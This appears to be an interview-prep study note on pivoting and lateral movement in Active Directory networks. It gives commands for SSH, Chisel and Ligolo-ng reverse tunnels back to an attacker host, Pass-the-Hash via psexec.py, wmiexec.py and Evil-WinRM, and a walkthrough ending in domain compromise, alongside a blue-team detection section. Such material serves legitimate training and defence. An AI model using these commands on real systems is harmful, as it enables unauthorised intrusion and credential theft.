---
tags: [vapt, methodology, network-security, interview, master-guide]
difficulty: expert
module: "Ultimate VAPT Master Guides - Network"
topic: "Master Guide - Network VAPT 05"
---

# Master Guide: Pivoting and Lateral Movement Methodologies

## 1. Interview Strategy: How to Explain Pivoting & Lateral Movement
Pivoting and Lateral Movement are the core of internal penetration testing. In an interview, candidates must clearly distinguish between the two concepts:
- **Pivoting (Routing/Proxying):** Using a compromised machine to route traffic to networks you cannot directly access. (It's about *network access*).
- **Lateral Movement:** Executing code, authenticating, or transferring access from one compromised machine to another machine. (It's about *system access*).

Structure your methodology:
1.  **Establish the Pivot:** Explain modern proxy techniques (Ligolo-ng, Chisel, SSH tunneling). Emphasize why old tools (like traditional Metasploit autoroute) are slow or limited.
2.  **Credential Dumping:** Once the pivot is established, explain how you extract secrets (LSASS, SAM, Kerberos tickets) from the initial foothold.
3.  **Lateral Movement Execution:** Detail the protocols used to move laterally (WMI, WinRM, PsExec, SMB) and the authentication mechanisms (Pass-the-Hash, Overpass-the-Hash).
4.  **OPSEC Considerations:** Discuss why WMI is stealthier than PsExec, and how Pass-the-Ticket leaves fewer forensic artifacts than Pass-the-Hash.

*Key Interview Phrase:* "My approach to moving through a network relies on establishing a stable, robust routing layer using tools like Ligolo-ng, which provides a true tun interface rather than a slow SOCKS proxy. For lateral movement, I avoid noisy techniques like PsExec that drop binaries to disk. Instead, I rely on 'living off the land' techniques, leveraging built-in Windows management protocols like WMI and WinRM to execute code entirely in memory."

---

## 2. Pivoting Methodologies (Routing Traffic)

Pivoting allows an attacker to run tools from their native Kali machine directly against deep internal subnets.

### SSH Port Forwarding (The Classic Reliable Pivot)
If the compromised host is Linux, SSH is the native, safest way to pivot.
- **Local Port Forwarding (`-L`):** Access a single remote port.
  `ssh -L 8080:internal-db:1433 user@dmz-server` (Maps attacker's local 8080 to the database).
- **Remote Port Forwarding (`-R`):** Punch out of a restrictive firewall.
  `ssh -R 4444:localhost:4444 attacker@attacker-server` (Sends internal traffic to the attacker).
- **Dynamic Port Forwarding (`-D`):** Creates a SOCKS proxy.
  `ssh -D 9050 user@dmz-server` -> Configure `/etc/proxychains.conf` -> `proxychains nmap -sT internal-ip`

### Chisel (Fast SOCKS / Reverse Tunnels)
Chisel is a fast TCP/UDP tunnel over HTTP, written in Go. Ideal when SSH is blocked, but outbound HTTP/HTTPS is allowed.
- *Attacker Server:* `chisel server -p 8000 --reverse`
- *Compromised Host:* `chisel client attacker_ip:8000 R:socks`
- *Impact:* Opens a SOCKS5 proxy on the attacker's machine routing through the compromised host.

### Ligolo-ng (The Modern Gold Standard)
Unlike SOCKS proxies (which struggle with UDP, ICMP, and certain nmap scans), Ligolo-ng creates a virtual TUN interface on the attacker machine. It acts like a true VPN into the target network.
- *Attacker (Setup):*
  ```bash
  sudo ip tuntap add user kali mode tun ligolo
  sudo ip link set ligolo up
  ./proxy -selfcert
  ```
- *Compromised Host:* `ligolo-agent.exe -connect attacker_ip:11601 -ignore-cert`
- *Attacker (Route):* Add an IP route `sudo ip route add 10.20.0.0/24 dev ligolo`. Now you can run raw `nmap` scans, ping, and run any tool natively without proxychains.

---

## 3. Lateral Movement Methodologies (Executing Code)

Once a pivot is established and credentials/hashes are obtained, we move laterally across the Active Directory environment.

### PsExec (The Noisy Classic)
**Mechanism:** Uses SMB to upload a service executable to `ADMIN$`, creates a Windows service via RPC, and executes it.
**Pros:** Easy, gives `SYSTEM` shell.
**Cons:** Extremely noisy. Drops a binary to disk. Guaranteed to trigger EDR/Antivirus.
- *Tool:* Impacket's `psexec.py` or Sysinternals `PsExec.exe`.
- *Command:* `psexec.py domain/user@10.10.10.5 -hashes :<NTLM_HASH>`

### WMI (Windows Management Instrumentation)
**Mechanism:** Uses DCOM (Distributed Component Object Model) over RPC (Port 135) to interact with the WMI service.
**Pros:** Stealthy. "Living off the land." Executes commands silently without dropping distinct service binaries like PsExec.
- *Tool:* Impacket's `wmiexec.py` or native PowerShell.
- *Command:* `wmiexec.py domain/user@10.10.10.5 -hashes :<NTLM_HASH>`
- *OPSEC Note:* Leaves logs in `Microsoft-Windows-WMI-Activity/Operational` (Event ID 5861).

### WinRM (Windows Remote Management)
**Mechanism:** Uses SOAP over HTTP (Port 5985) or HTTPS (Port 5986). It is the backbone of PowerShell Remoting.
**Pros:** Native administration tool. Traffic blends in well in environments that use SCCM or automated administration.
- *Tool:* `Evil-WinRM`, `CrackMapExec`.
- *Evil-WinRM Command:* `evil-winrm -i 10.10.10.5 -u Administrator -H <NTLM_HASH>`
- *Feature:* `Evil-WinRM` supports in-memory AMSI bypasses and loading remote PowerShell scripts seamlessly.

### DCOM (Distributed COM)
**Mechanism:** Abusing MMC (Microsoft Management Console) Application Classes (like `MMC20.Application` or `ShellWindows`) to execute macros or commands remotely via RPC.
**Pros:** Very stealthy, bypasses some endpoint monitoring that focuses heavily on WMI and WinRM.
- *Tool:* Impacket's `dcomexec.py`.

---

## 4. Authentication Mechanisms for Lateral Movement

You rarely need plaintext passwords.

- **Pass-the-Hash (PtH):** Uses the NTLM hash directly to authenticate over SMB/WMI/WinRM. (Requires local admin rights on the target).
- **Overpass-the-Hash (Pass-the-Key):** Uses the NTLM hash to request a Kerberos Ticket Granting Ticket (TGT). Converts an NTLM attack into a Kerberos attack, which is stealthier and avoids NTLM-blocking policies.
- **Pass-the-Ticket (PtT):** Steals an existing Kerberos TGT or TGS from LSASS memory (using Mimikatz or Rubeus) and injects it into your current session. Requires NO hashes or passwords. Grants access to whatever the ticket allows.

---

## ASCII Diagram: Double Pivot and Lateral Movement

```text
[ Attacker Machine ]
  (Kali Linux)
       |
       |  (Ligolo-ng TUN Interface: Route 10.20.0.0/24)
       v
[ Web Server (DMZ) ]   <-- FOOTHOLD (10.10.10.5)
  (Ligolo Agent)
       |
       |  (Ligolo-ng TUN Interface: Route 10.30.0.0/24)
       |  (SSH Port Forwarding to deeper segment)
       v
[ Internal DB Server ] <-- PIVOT 2 (10.20.20.10)
  (Chisel Server)
       |
       |  (Extracts NTLM Hash from memory)
       |  (Uses Proxychains + wmiexec.py PtH)
       v
[ Domain Controller ]  <-- TARGET (10.30.30.100)
  (Executes malicious payload via WMI)
```

---

## 5. Real-World Attack Scenario

**Scenario: The Ligolo-to-WMI Double Jump**
1. **Initial Breach:** The pentester gains a shell on a Linux Apache server in the DMZ via an unrestricted file upload vulnerability.
2. **First Pivot:** The DMZ server cannot talk to the internet, but the attacker's server is reachable via port 443. The attacker drops a Ligolo-ng agent, connecting back to the attacker's Ligolo server. A TUN interface is established, allowing direct access to the internal `10.10.0.0/16` network.
3. **Internal Recon:** Through the Ligolo tunnel, the attacker runs BloodHound collector (`SharpHound`) from their Kali machine using proxychains. The AD graph shows that a Helpdesk user session is active on a nearby Windows 10 workstation (`10.10.50.22`).
4. **Lateral Movement 1:** The attacker possesses a compromised service account hash. They use `wmiexec.py` over the Ligolo tunnel to execute commands on the Windows 10 workstation.
5. **Credential Theft:** The attacker uses `lsassy` (remote LSASS dumper) to extract the NTLM hash of the Helpdesk user currently logged into the workstation.
6. **Lateral Movement 2:** The BloodHound graph shows the Helpdesk user has administrative rights to the Domain Controller. The attacker drops `Evil-WinRM`, uses the Helpdesk user's hash (Pass-the-Hash), and logs directly into the Domain Controller, achieving total compromise.

---

## 6. Chaining Opportunities

- **Web Exploitation -> Pivoting:** Use a simple PHP web shell to upload and execute a Chisel or Ligolo agent, upgrading a limited HTTP-based shell into a full TCP/UDP network tunnel.
- **Local Privilege Escalation -> Pass-the-Ticket:** Elevate privileges to SYSTEM on a workstation, dump Kerberos tickets with Rubeus, and use Pass-the-Ticket to move laterally without touching LSASS or NTLM hashes.
- **Relay Attacks -> Lateral Movement:** Capture SMB traffic, relay the authentication to a target machine, and execute a reverse shell payload using WMI or PsExec.

---

## 7. Related Notes

- [[Network VAPT 03 - Attacking Network Services SMB FTP SSH]] - SMB and SSH are the transport layers heavily utilized in pivoting and lateral movement.
- [[Network VAPT 04 - Bypassing Firewalls NAC and Network Segregation]] - Review how to bypass egress filtering to establish your Ligolo or Chisel tunnels.
- [[Active Directory Post-Exploitation]] - Deep dive into dumping credentials (Mimikatz/Rubeus) necessary for Pass-the-Hash.

---
**Disclaimer:** Lateral movement and credential dumping techniques deeply interact with the core operating system and Active Directory security mechanisms. These actions often trigger EDR and SoC alerts and should only be performed during authorized red teaming or VAPT engagements.

---

## 8. Deep Dive: Port Forwarding and Proxy Internals
Understanding the underlying network mechanics of your proxy is essential for troubleshooting during an engagement or interview.
- **SOCKS4 vs SOCKS5:** SOCKS4 only supports TCP and uses IPv4. SOCKS5 supports TCP, UDP, IPv6, and authentication. If you need to run an Nmap UDP scan through a proxy, you MUST use SOCKS5, and even then, tool compatibility is flaky.
- **The TUN/TAP Advantage (Ligolo-ng):** A TUN interface works at Layer 3 (IP). It intercepts raw IP packets, encapsulates them, and sends them to the agent. This means the attacker's OS handles the routing, allowing tools like Nmap (which send raw TCP SYN packets) to work perfectly. Proxychains, on the other hand, intercepts library calls (Layer 7), which is why raw sockets (Nmap `-sS`) fail through Proxychains.
- **Double Pivoting (Inception):** You compromise Server A, pivot to Server B, and need to scan Subnet C. You must chain your tunnels.
  - *With Chisel:* You run a chisel server on A, client on B to reverse a tunnel to A, then forward that tunnel through another chisel connection back to your Kali machine.
  - *With Ligolo-ng:* You simply run a second agent on Server B and add another route on your Kali machine. This simplicity is why Ligolo is the modern standard.

## 9. Comprehensive Tool Reference Matrix
| Tool | Category | Primary Use Case | Protocol / Mechanism |
|------|----------|------------------|----------------------|
| Ligolo-ng | Pivoting | Creates a Layer 3 TUN interface for native, fast routing. | Custom Go binary / TLS |
| Chisel | Pivoting | Fast TCP/UDP tunneling over HTTP. Great for bypassing deep packet inspection. | HTTP/S |
| Proxychains | Pivoting | Forcing non-proxy-aware tools to route traffic through a SOCKS proxy. | Library Hooking (LD_PRELOAD) |
| sshuttle | Pivoting | A poor man's VPN using SSH. Routes subnets transparently. | SSH / Python |
| wmiexec.py | Lateral Move | Executing commands stealthily using Windows Management Instrumentation. | DCOM / RPC (Port 135) |
| psexec.py | Lateral Move | Easy system-level execution, but highly detectable. | SMB (Port 445) / RPC |
| Evil-WinRM | Lateral Move | Remote administration shell utilizing native Windows protocols. | HTTP/S (Port 5985/5986) |
| Mimikatz | Credential | Extracting plaintext passwords, hashes, and Kerberos tickets from memory. | LSASS manipulation |

## 10. Blue Team: Detection Engineering for Lateral Movement
- **Detecting WMI Execution:** `wmiexec.py` creates a process (usually `cmd.exe`) whose parent process is `WmiPrvSE.exe`. EDR solutions (like CrowdStrike or Defender for Endpoint) flag this parent-child relationship immediately as highly suspicious.
- **Detecting PsExec:** PsExec writes a distinct executable (e.g., `PSEXESVC.exe`) to the `ADMIN$` share and registers a service. The creation of a service with a randomly generated name (Impacket's default behavior) triggers massive alerts.
- **Detecting Pass-the-Hash:** A Pass-the-Hash attack generates an Event ID 4624 (Logon) with Logon Type 3 (Network). If the authentication uses NTLM instead of Kerberos in a modern environment, and the source IP is unusual for that user, the SIEM will trigger an alert.
- **Detecting Pivoting:** Massive amounts of SSH traffic, or continuous, long-lived TCP connections (Chisel/Ligolo) to an unknown external IP from a DMZ server, are flagged by network behavioral analytics tools.

## 11. Common Interview Pitfalls and How to Avoid Them
1.  **Confusing Pivoting with Lateral Movement**: Never use these interchangeably. Pivoting is making your Kali machine reach the internal network. Lateral movement is getting code execution on the Domain Controller.
2.  **Relying purely on Metasploit**: Saying "I use meterpreter autoroute" is a dated answer. It is slow and unstable. Mentioning Ligolo-ng or Chisel demonstrates that you are an advanced, modern practitioner.
3.  **Forgetting OPSEC**: If asked how to move laterally, do not just say "PsExec". Start with the stealthiest option (WinRM or DCOM/WMI), explain why it's stealthy, and only mention PsExec as a last resort.
4.  **Misunderstanding Proxychains**: Interviewers will often ask: "Why did your Nmap SYN scan fail through Proxychains?" The expert answer is: "Proxychains uses LD_PRELOAD to hook socket calls. It cannot hook raw sockets, which Nmap uses for SYN scans. I must use a full TCP connect scan (`-sT`) or switch to a TUN-based proxy like Ligolo."
